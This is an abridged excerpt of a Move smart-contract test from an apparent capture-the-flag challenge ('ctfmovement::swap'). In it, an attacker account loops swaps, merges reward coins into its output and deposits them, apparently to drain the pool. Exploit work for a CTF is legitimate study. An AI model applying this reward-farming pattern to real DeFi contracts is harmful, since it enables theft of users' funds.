...
module ctfmovement::swap {
    ...
    #[test(attacker=@0x888, admin=@ctfmovement)]
    public fun test(attacker: &signer, admin: &signer) acquires SwapMeta, Pool{
        ...
        loop{
            ...
            let (simple_coin, reward) = swap_exact_y_to_x_direct<SimpleCoin, TestUSDC>(test_usdc);

            aptos_framework::debug::print(&111111111111111111);
            aptos_framework::debug::print(&amount);
            aptos_framework::debug::print(&coin::value<SimpleCoin>(&simple_coin));
            aptos_framework::debug::print(&coin::value<SimpleCoin>(&reward));

            coin::merge<SimpleCoin>(&mut simple_coin, reward);
            coin::deposit<SimpleCoin>(signer::address_of(attacker), simple_coin);

            aptos_framework::debug::print(&coin::balance<SimpleCoin>(signer::address_of(attacker)));
